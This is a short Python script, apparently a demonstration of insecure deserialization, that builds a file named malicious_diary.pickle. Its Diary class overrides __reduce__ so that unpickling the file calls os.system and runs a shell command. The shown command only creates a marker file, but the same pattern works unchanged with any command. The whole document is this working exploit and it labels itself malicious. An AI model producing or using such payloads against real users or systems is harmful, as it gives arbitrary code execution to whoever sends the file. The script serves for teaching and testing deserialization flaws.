import os
import pickle


class Diary:
    def __init__(self, content=""):
        self.content = content

    def __reduce__(self):
        return os.system, ("touch ./you_have_been_hacked.txt",)


if __name__ == "__main__":
    diary_object = Diary("This is a malicious diary entry!")

    with open("malicious_diary.pickle", "wb") as f:
        pickle.dump(diary_object, f)

    print("Malicious diary created: malicious_diary.pickle")
